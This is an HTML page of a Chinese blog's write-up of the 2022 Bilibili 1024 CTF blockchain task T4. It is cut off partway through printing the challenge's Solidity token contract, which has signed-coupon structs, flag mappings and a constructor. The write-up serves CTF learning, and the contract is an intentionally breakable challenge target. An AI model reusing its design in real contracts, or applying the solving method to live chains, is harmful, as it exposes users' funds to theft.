



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="google-site-verification" content="qQVmgWozVe7BXoA15J3gAZpEA5dK168admH4U3W6PAk">
  <meta name="msvalidate.01" content="4902E39C0135E72DE537BCB0FE08B40A">
  <meta name="baidu-site-verification" content="codeva-CSYjpuVg5v">


<link rel="alternate" type="application/rss+xml" title="oaciaのBbBlog~" href="https://oacia.dev/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="oaciaのBbBlog~" href="https://oacia.dev/atom.xml" />
<link rel="alternate" type="application/json" title="oaciaのBbBlog~" href="https://oacia.dev/feed.json" />
<link
      rel="preload"
      as="font"
      type="font/woff2"
      crossorigin=""
      href="/fonts/noto-serif-sc-v22-chinese-simplified_latin-regular.woff2"
/>
<link
      rel="preload"
      as="font"
      type="font/woff2"
      crossorigin=""
      href="/fonts/noto-serif-sc-v22-chinese-simplified_latin-700.woff2"
/>
<link
      rel="preload"
      as="font"
      type="font/woff2"
      crossorigin=""
      href="/fonts/font_1832207_igi8uaupcus.woff2"
/>
<link rel="preload" href="/background_picture/1_gongzi.webp" as="image" />
<link rel="preload" href="/background_picture/2_xiaoxia.webp" as="image" />
<link rel="preload" href="/background_picture/3_xingye.webp" as="image" />
<link rel="preload" href="/images/avatar.jpg" as="image" />



<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="CTF,智能合约,区块链,solidity" />


<link rel="canonical" href="https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/">


<meta name="description" content="本次题目的地址为 sepolia@0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA  # 前言 这一次 1024 程序员节中有区块链相关的题目，作为今年才开始起步区块链的小萌新，这一题也是整整看了一整个周末才做出来，不过做出来之后也是相当的具有成就感滴：), 话不多说，我们现在就来看一看如何做出这一题.">
<meta property="og:type" content="article">
<meta property="og:title" content="2022哔哩哔哩 1024程序员节 T4 区块链详解">
<meta property="og:url" content="https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/">
<meta property="og:site_name" content="oaciaのBbBlog~">
<meta property="og:description" content="本次题目的地址为 sepolia@0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA  # 前言 这一次 1024 程序员节中有区块链相关的题目，作为今年才开始起步区块链的小萌新，这一题也是整整看了一整个周末才做出来，不过做出来之后也是相当的具有成就感滴：), 话不多说，我们现在就来看一看如何做出这一题.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/image-20221101140608227.png">
<meta property="og:image" content="https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/image-20221101140901701.png">
<meta property="og:image" content="https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/image-20221101140950991.png">
<meta property="article:published_time" content="2022-10-31T16:00:00.000Z">
<meta property="article:modified_time" content="2025-04-08T18:55:11.177Z">
<meta property="article:author" content="oacia">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="智能合约">
<meta property="article:tag" content="区块链">
<meta property="article:tag" content="solidity">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/image-20221101140608227.png">
<meta name="twitter:creator" content="@oacia86">


  <title>
2022哔哩哔哩 1024程序员节 T4 区块链详解 |
oacia = oaciaのBbBlog~ = DEVIL or SWEET</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script>
  var jq_151 = $.noConflict(true);
  var RENDERER = {
    INIT_CHERRY_BLOSSOM_COUNT : 30,
    MAX_ADDING_INTERVAL : 10,
    WATCH_INTERVAL : 300,
    
    init : function(){
      this.setParameters();
      this.reconstructMethods();
      this.setup();
      this.bindEvent();
      this.render();
    },
    setParameters : function(){
      this.$window = jq_151(window);
      this.$container = jq_151('#loading');
      this.$canvas = jq_151('<canvas />');
      this.context = this.$canvas.appendTo(this.$container).get(0).getContext('2d');
      this.cherries = [];
      this.watchIds = [];
    },
    reconstructMethods : function(){
      this.watchWindowSize = this.watchWindowSize.bind(this);
      this.jdugeToStopResize = this.jdugeToStopResize.bind(this);
      this.render = this.render.bind(this);
    },
    setup : function(){
      this.cherries.length = 0;
      this.watchIds.length = 0;
      this.width = this.$container.width();
      this.height = this.$container.height();
      this.$canvas.attr({width : this.width, height : this.height});
      this.maxAddingInterval = Math.round(this.MAX_ADDING_INTERVAL * 1000 / this.width);
      this.addingInterval = this.maxAddingInterval;
      this.createCherries();
    },
    createCherries : function(){
      for(var i = 0, length = Math.round(this.INIT_CHERRY_BLOSSOM_COUNT * this.width / 1000); i < length; i++){
        this.cherries.push(new CHERRY_BLOSSOM(this, true));
      }
    },
    watchWindowSize : function(){
      this.clearTimer();
      this.tmpWidth = window.width;
      this.tmpHeight = window.height;
      this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL));
    },
    clearTimer : function(){
      while(this.watchIds.length > 0){
        clearTimeout(this.watchIds.pop());
      }
    },
    jdugeToStopResize : function(){
      var width = window.width,
        height = window.height,
        stopped = (width == this.tmpWidth && height == this.tmpHeight);
        
      this.tmpWidth = width;
      this.tmpHeight = height;
      
      if(stopped){
        this.setup();
      }
    },
    bindEvent : function(){
      this.$window.on('resize', this.watchWindowSize);
    },
    render : function(){
      //console.log("render")

      if(jq_151(this.$container).css("display")!="none"){
        requestAnimationFrame(this.render);
      }
      
      this.context.clearRect(0, 0, this.width, this.height);
      
      this.cherries.sort(function(cherry1, cherry2){
        return cherry1.z - cherry2.z;
      });
      for(var i = this.cherries.length - 1; i >= 0; i--){
        if(!this.cherries[i].render(this.context)){
          this.cherries.splice(i, 1);
        }
      }
      if(--this.addingInterval == 0){
        this.addingInterval = this.maxAddingInterval;
        this.cherries.push(new CHERRY_BLOSSOM(this, false));
      }
    }
  };
  var CHERRY_BLOSSOM = function(renderer, isRandom){
    this.renderer = renderer;
    this.init(isRandom);
  };
  CHERRY_BLOSSOM.prototype = {
    FOCUS_POSITION : 300,
    FAR_LIMIT : 600,
    MAX_RIPPLE_COUNT : 100,
    RIPPLE_RADIUS : 100,
    SURFACE_RATE : 0.5,
    SINK_OFFSET : 20,
    
    init : function(isRandom){
      this.x = this.getRandomValue(-this.renderer.width, this.renderer.width);
      this.y = isRandom ? this.getRandomValue(0, this.renderer.height) : this.renderer.height * 1.5;
      this.z = this.getRandomValue(0, this.FAR_LIMIT);
      this.vx = this.getRandomValue(-2, 2);
      this.vy = -2;
      this.theta = this.getRandomValue(0, Math.PI * 2);
      this.phi = this.getRandomValue(0, Math.PI * 2);
      this.psi = 0;
      this.dpsi = this.getRandomValue(Math.PI / 600, Math.PI / 300);
      this.opacity = 0;
      this.endTheta = false;
      this.endPhi = false;
      this.rippleCount = 0;
      
      var axis = this.getAxis(),
        theta = this.theta + Math.ceil(-(this.y + this.renderer.height * this.SURFACE_RATE) / this.vy) * Math.PI / 500;
      theta %= Math.PI * 2;
      
      this.offsetY = 40 * ((theta <= Math.PI / 2 || theta >= Math.PI * 3 / 2) ? -1 : 1);
      this.thresholdY = this.renderer.height / 2 + this.renderer.height * this.SURFACE_RATE * axis.rate;
      this.entityColor = this.renderer.context.createRadialGradient(0, 40, 0, 0, 40, 80);
      this.entityColor.addColorStop(0, 'hsl(330, 70%, ' + 50 * (0.3 + axis.rate) + '%)');
      this.entityColor.addColorStop(0.05, 'hsl(330, 40%,' + 55 * (0.3 + axis.rate) + '%)');
      this.entityColor.addColorStop(1, 'hsl(330, 20%, ' + 70 * (0.3 + axis.rate) + '%)');
      this.shadowColor = this.renderer.context.createRadialGradient(0, 40, 0, 0, 40, 80);
      this.shadowColor.addColorStop(0, 'hsl(330, 40%, ' + 30 * (0.3 + axis.rate) + '%)');
      this.shadowColor.addColorStop(0.05, 'hsl(330, 40%,' + 30 * (0.3 + axis.rate) + '%)');
      this.shadowColor.addColorStop(1, 'hsl(330, 20%, ' + 40 * (0.3 + axis.rate) + '%)');
    },
    getRandomValue : function(min, max){
      return min + (max - min) * Math.random();
    },
    getAxis : function(){
      var rate = this.FOCUS_POSITION / (this.z + this.FOCUS_POSITION),
        x = this.renderer.width / 2 + this.x * rate,
        y = this.renderer.height / 2 - this.y * rate;
      return {rate : rate, x : x, y : y};
    },
    renderCherry : function(context, axis){
      context.beginPath();
      context.moveTo(0, 40);
      context.bezierCurveTo(-60, 20, -10, -60, 0, -20);
      context.bezierCurveTo(10, -60, 60, 20, 0, 40);
      context.fill();
      
      for(var i = -4; i < 4; i++){
        context.beginPath();
        context.moveTo(0, 40);
        context.quadraticCurveTo(i * 12, 10, i * 4, -24 + Math.abs(i) * 2);
        context.stroke();
      }
    },
    render : function(context){
      var axis = this.getAxis();
      
      if(axis.y == this.thresholdY && this.rippleCount < this.MAX_RIPPLE_COUNT){
        context.save();
        context.lineWidth = 2;
        context.strokeStyle = 'hsla(0, 0%, 100%, ' + (this.MAX_RIPPLE_COUNT - this.rippleCount) / this.MAX_RIPPLE_COUNT + ')';
        context.translate(axis.x + this.offsetY * axis.rate * (this.theta <= Math.PI ? -1 : 1), axis.y);
        context.scale(1, 0.3);
        context.beginPath();
        context.arc(0, 0, this.rippleCount / this.MAX_RIPPLE_COUNT * this.RIPPLE_RADIUS * axis.rate, 0, Math.PI * 2, false);
        context.stroke();
        context.restore();
        this.rippleCount++;
      }
      if(axis.y < this.thresholdY || (!this.endTheta || !this.endPhi)){
        if(this.y <= 0){
          this.opacity = Math.min(this.opacity + 0.01, 1);
        }
        context.save();
        context.globalAlpha = this.opacity;
        context.fillStyle = this.shadowColor;
        context.strokeStyle = 'hsl(330, 30%,' + 40 * (0.3 + axis.rate) + '%)';
        context.translate(axis.x, Math.max(axis.y, this.thresholdY + this.thresholdY - axis.y));
        context.rotate(Math.PI - this.theta);
        context.scale(axis.rate * -Math.sin(this.phi), axis.rate);
        context.translate(0, this.offsetY);
        this.renderCherry(context, axis);
        context.restore();
      }
      context.save();
      context.fillStyle = this.entityColor;
      context.strokeStyle = 'hsl(330, 40%,' + 70 * (0.3 + axis.rate) + '%)';
      context.translate(axis.x, axis.y + Math.abs(this.SINK_OFFSET * Math.sin(this.psi) * axis.rate));
      context.rotate(this.theta);
      context.scale(axis.rate * Math.sin(this.phi), axis.rate);
      context.translate(0, this.offsetY);
      this.renderCherry(context, axis);
      context.restore();
      
      if(this.y <= -this.renderer.height / 4){
        if(!this.endTheta){
          for(var theta = Math.PI / 2, end = Math.PI * 3 / 2; theta <= end; theta += Math.PI){
            if(this.theta < theta && this.theta + Math.PI / 200 > theta){
              this.theta = theta;
              this.endTheta = true;
              break;
            }
          }
        }
        if(!this.endPhi){
          for(var phi = Math.PI / 8, end = Math.PI * 7 / 8; phi <= end; phi += Math.PI * 3 / 4){
            if(this.phi < phi && this.phi + Math.PI / 200 > phi){
              this.phi = Math.PI / 8;
              this.endPhi = true;
              break;
            }
          }
        }
      }
      if(!this.endTheta){
        if(axis.y == this.thresholdY){
          this.theta += Math.PI / 200 * ((this.theta < Math.PI / 2 || (this.theta >= Math.PI && this.theta < Math.PI * 3 / 2)) ? 1 : -1);
        }else{
          this.theta += Math.PI / 500;
        }
        this.theta %= Math.PI * 2;
      }
      if(this.endPhi){
        if(this.rippleCount == this.MAX_RIPPLE_COUNT){
          this.psi += this.dpsi;
          this.psi %= Math.PI * 2;
        }
      }else{
        this.phi += Math.PI / ((axis.y == this.thresholdY) ? 200 : 500);
        this.phi %= Math.PI;
      }
      if(this.y <= -this.renderer.height * this.SURFACE_RATE){
        this.x += 2;
        this.y = -this.renderer.height * this.SURFACE_RATE;
      }else{
        this.x += this.vx;
        this.y += this.vy;
      }
      return this.z > -this.FOCUS_POSITION && this.z < this.FAR_LIMIT && this.x < this.renderer.width * 1.5;
    }
  };
  jq_151(function(){
    RENDERER.init();
  });
</script>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <!--
    <div class="alice">
      <img src="/images/alice-shake.gif" alt="">
    </div>

    
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
    -->
  </div>
  <script
      defer="defer"
      src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.6.0/gsap.min.js"
      integrity="sha512-1dalHDkG9EtcOmCnoCjiwQ/HEB5SDNqw8d4G2MKoNwjiwMNeBAkudsBCmSlMnXdsH8Bm0mOd3tl/6nL5y0bMaQ=="
      crossorigin="anonymous"
    ></script>
  <script defer="defer" src="/js/gsap/DrawSVGPlugin.min.js"></script>
  <script defer="defer" src="/js/gsap/CustomEase.min.js"></script>
  <script defer="defer" src="/js/gsap/CustomBounce.min.js"></script>
  <script defer="defer" src="/js/gsap/SplitText.min.js"></script>
  <script defer="defer" src="/js/gsap/logo-run.js"></script>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">2022哔哩哔哩 1024程序员节 T4 区块链详解
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2022-11-01 00:00:00">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2022-11-01T00:00:00+08:00">2022-11-01</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>18k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>16 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">oacia</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="/background_picture/1_mary.jpg"></li>
          <li class="item" data-background-image="/background_picture/2_xingye.webp"></li>
          <li class="item" data-background-image="/background_picture/3_xiaoxia.webp"></li>
          <li class="item" data-background-image="/background_picture/4_alice.webp"></li>
          <li class="item" data-background-image="/background_picture/5_mutsuki.jpg"></li>
          <li class="item" data-background-image="/background_picture/6_arona_plana.webp"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb">
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="https://oacia.dev/2022%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9_1024%E7%A8%8B%E5%BA%8F%E5%91%98%E8%8A%82_T4_%E5%8C%BA%E5%9D%97%E9%93%BE%E8%AF%A6%E8%A7%A3/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="oacia">
    <meta itemprop="description" content="DEVIL or SWEET, 月遇从云 花遇和风">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="oaciaのBbBlog~">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <blockquote>
<p>本次题目的地址为<strong> sepolia@0x053cd080A26CB03d5E6d2956CeBB31c56E7660CA</strong></p>
</blockquote>
<h3 id="前言"><a class="anchor" href="#前言">#</a> 前言</h3>
<p>这一次 1024 程序员节中有区块链相关的题目，作为今年才开始起步区块链的小萌新，这一题也是整整看了一整个周末才做出来，不过做出来之后也是相当的具有成就感滴：), 话不多说，我们现在就来看一看如何做出这一题.</p>
<hr>
<span id="more"></span>
<h3 id="源码"><a class="anchor" href="#源码">#</a> 源码</h3>
<p>先上合约源码↓↓↓↓↓↓</p>
<figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.12</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> <span class="token string">"./IERC20.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> <span class="token string">"./IERC20Metadata.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">import</span> <span class="token string">"./Context.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">//import "@openzeppelin/contracts/token/ERC20/IERC20.sol";</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">//import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token comment">//import "@openzeppelin/contracts/utils/Context.sol";</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">struct</span> <span class="token class-name">Coupon</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token builtin">uint</span> loankey<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token builtin">uint256</span> amount<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token builtin">address</span> buser<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token builtin">bytes</span> reason<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">struct</span> <span class="token class-name">Signature</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token builtin">uint8</span> v<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> rs<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">struct</span> <span class="token class-name">SignCoupon</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    Coupon coupon<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    Signature signature<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">MyToken</span> <span class="token keyword">is</span> Context<span class="token punctuation">,</span> IERC20<span class="token punctuation">,</span> IERC20Metadata <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> _balances<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> _ebalances<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> ethbalances<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">private</span> _allowances<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> _profited<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> _auth_one<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> _authd<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> _loand<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> _flag<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> _depositd<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token builtin">uint256</span> <span class="token keyword">private</span> _totalSupply<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token builtin">string</span> <span class="token keyword">private</span> _name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token builtin">string</span> <span class="token keyword">private</span> _symbol<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token builtin">address</span> owner<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token builtin">address</span> backup<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>    <span class="token builtin">uint</span> secret<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token builtin">uint</span> tokenprice<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre></pre></td></tr><tr><td data-num="55"></td><td><pre>    Coupon <span class="token keyword">public</span> c<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> lala<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> xixi<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre></pre></td></tr><tr><td data-num="61"></td><td><pre>    <span class="token comment">//mid = bilibili uid</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    <span class="token comment">//b64email = base64(your email address)</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token comment">//Don't leak your bilibili uid</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token comment">//Gmail is ok. 163 and qq may have some problems.</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token keyword">event</span> <span class="token function">sendflag</span><span class="token punctuation">(</span><span class="token builtin">string</span> mid<span class="token punctuation">,</span> <span class="token builtin">string</span> b64email<span class="token punctuation">)</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="66"></td><td><pre>    <span class="token keyword">event</span> <span class="token function">changeprice</span><span class="token punctuation">(</span><span class="token builtin">uint</span> secret_<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre></pre></td></tr><tr><td data-num="68"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token keyword">memory</span> name_<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">memory</span> symbol_<span class="token punctuation">,</span> <span class="token builtin">uint</span> secret_<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="69"></td><td><pre>        _name <span class="token operator">=</span> name_<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="70"></td><td><pre>        _symbol <span class="token operator">=</span> symbol_<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="71"></td><td><pre>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="72"></td><td><pre>        backup <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>        tokenprice <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>        secret <span class="token operator">=</span> secret_<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="75"></td><td><pre>        <span class="token function">_mint</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> <span class="token number">2233102400</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="76"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="77"></td><td><pre></pre></td></tr><tr><td data-num="78"></td><td><pre>    <span class="token keyword">modifier</span> <span class="token function">onlyowner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="79"></td><td><pre>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>        <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre>    <span class="token 